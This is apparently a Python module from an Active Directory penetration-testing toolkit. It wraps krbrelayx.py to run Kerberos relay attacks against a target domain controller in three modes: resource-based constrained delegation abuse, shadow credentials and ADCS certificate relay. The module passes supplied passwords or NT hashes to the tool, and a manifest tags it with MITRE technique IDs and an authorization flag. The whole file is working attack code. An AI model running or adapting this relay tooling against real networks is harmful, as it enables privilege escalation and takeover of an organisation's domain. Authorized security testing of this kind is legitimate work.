"""krbrelayx — Kerberos relay and RBCD/shadow credentials abuse."""
from __future__ import annotations
import subprocess
import sys
import shutil
from typing import Any
from adxpl.core.credential import ADCredential

MANIFEST = {
    "capability_id": "adxpl.relay.krbrelayx.v1",
    "safety_class": "ACTIVE",
    "requires_authorization": True,
    "side_effects": ["kerberos_relay", "ldap_modification"],
    "output_schema": "xpl.finding.v1",
    "mitre": ["T1557.001", "T1558"],
}


def run(args: Any) -> int:
    cred = ADCredential.from_args(args)
    target = args.target
    mode = getattr(args, "krbrelay_mode", "rbcd")

    if not shutil.which("krbrelayx.py"):
        print("[!] krbrelayx.py not found — pip install krbrelayx", file=sys.stderr)
        return 1

    cmd = ["krbrelayx.py"]

    if mode == "rbcd":
        cmd.extend(["-t", "ldap://{}".format(target)])
        cmd.append("--delegate-access")
    elif mode == "shadow":
        cmd.extend(["-t", "ldap://{}".format(target)])
        cmd.append("--shadow-credentials")
    elif mode == "adcs":
        template = getattr(args, "adcs_template", "Machine")
        cmd.extend(["-t", "http://{}".format(target)])
        cmd.extend(["--adcs", "--template", template])

    if cred.username:
        cmd.extend(["-u", "{}@{}".format(cred.username, cred.domain)])
    if cred.password:
        cmd.extend(["-p", cred.password])
    elif cred.has_hash:
        cmd.extend(["--hashes", "{}:{}".format(cred.lm_hash, cred.nt_hash)])

    print("[*] krbrelayx: mode={}, target={}".format(mode, target))
    print("[*] Command: {}".format(" ".join(cmd)))

    try:
        result = subprocess.run(cmd, capture_output=True, text=True, timeout=120)
        print(result.stdout)
        if result.returncode != 0:
            print(result.stderr, file=sys.stderr)
        return result.returncode
    except Exception as exc:
        print("[-] krbrelayx error: {}".format(exc), file=sys.stderr)
        return 1
